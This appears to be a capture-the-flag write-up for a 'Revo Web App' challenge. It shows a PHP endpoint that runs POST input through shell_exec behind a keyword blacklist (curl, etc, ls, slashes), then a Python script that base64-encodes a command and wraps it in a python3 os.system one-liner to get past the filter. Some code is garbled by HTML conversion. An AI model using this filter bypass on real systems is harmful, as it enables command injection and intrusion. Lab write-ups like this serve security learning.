<h3>Revo Web App</h3>

<p>Performing a directory scan reveals that there is a <code>/cmd.php</code> endpoint.</p>

<p>This seems to allow us to perform command injection, but there appears to be a blacklist filter. Fortunately, the <code>cat cmd.php</code> command works, allowing us to view the blacklist.</p>

<p>```php
<?php
  function test<em>input($data) {
    $str1 = "%44";
    $data2 = append</em>string ($str1, $data);
    return $data2;
  }</p>

<p>function display()
  {
    $bl = array("/",";","@","\","\/\/");
    $input = $<em>POST["cmd"];
    $input = str</em>replace($bl, "", $input);
    $bl2 = array("curl","shutdown","init","systemctl","ps","ls","etc");
    $input = str<em>replace($bl2, "", $input);
    $output = shell</em>exec($input);
    echo $output;
  }
  if(isset($_POST['submit']))
  {
    display();
  } 
 ?>
```</p>

<p>To overcome the blacklist, we used a base64-encoded payload, which is then decoded by Python on the server.</p>

<p>```python
import base64</p>

<p>PAYLOAD = b"cat /home/bobby/flag.txt"</p>

<p>encoded = base64.b64encode(PAYLOAD)
print(encoded)</p>

<p>command = "python3 -c '<strong>import</strong>(\"os\").system((<strong>import</strong>(\"base64\").b64decode(\"" + encoded.decode() + "\")))'"
print(command)
```</p>
